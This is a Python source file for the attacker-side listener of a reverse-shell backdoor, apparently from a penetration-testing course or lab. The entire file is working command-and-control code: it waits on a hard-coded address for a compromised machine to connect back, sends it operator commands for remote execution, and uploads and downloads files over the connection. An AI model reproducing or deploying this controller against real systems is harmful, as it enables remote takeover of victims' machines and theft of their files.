import socket
import json
import base64
import logging

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        logging.info(f"[+] Waiting for connection on {ip}:{port}")
        self.connection, address = listener.accept()
        logging.info(f"[+] Connection established from {address}")

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
            logging.debug(f"Sent: {data}")
        except Exception as e:
            logging.error(f"Failed to send data: {e}")

    def reliable_receive(self):
        try:
            json_data = b""
            while True:
                try:
                    json_data += self.connection.recv(1024)
                    return json.loads(json_data.decode())
                except ValueError:
                    continue
        except Exception as e:
            logging.error(f"Failed to receive data: {e}")
            return None

    def write_file(self, path, content):
        try:
            with open(path, "wb+") as file:
                file.write(base64.b64decode(content))
            return "[+] Downloaded Successfully"
        except Exception as e:
            logging.error(f"Failed to write file: {e}")
            return f"[-] Error downloading file: {e}"

    def read_file(self, path):
        try:
            with open(path, "rb+") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            logging.error(f"Failed to read file: {e}")
            return f"[-] Error reading file: {e}"

    def execute_remote_command(self, command):
        try:
            self.reliable_send(command)
            if command[0] == "exit":
                self.connection.close()
                logging.info("Exiting...")
                exit()
            return self.reliable_receive()
        except Exception as e:
            logging.error(f"Error executing remote command: {e}")
            return f"[-] Error during command execution"

    def run(self):
        while True:
            try:
                command = input(">> ")
                if command:
                    command = command.split(" ")
                    if command[0] == "upload":
                        file_content = self.read_file(command[1])
                        command.append(file_content)
                    result = self.execute_remote_command(command)
                    if command[0] == "download" and "[-] Error " not in result:
                        result = self.write_file(command[1], result)
                    print(result)
                else:
                    logging.warning("Empty command entered.")
            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                break

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        my_listener = Listener("10.0.2.4", 8080)
        my_listener.run()
    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt received. Exiting...")
        pass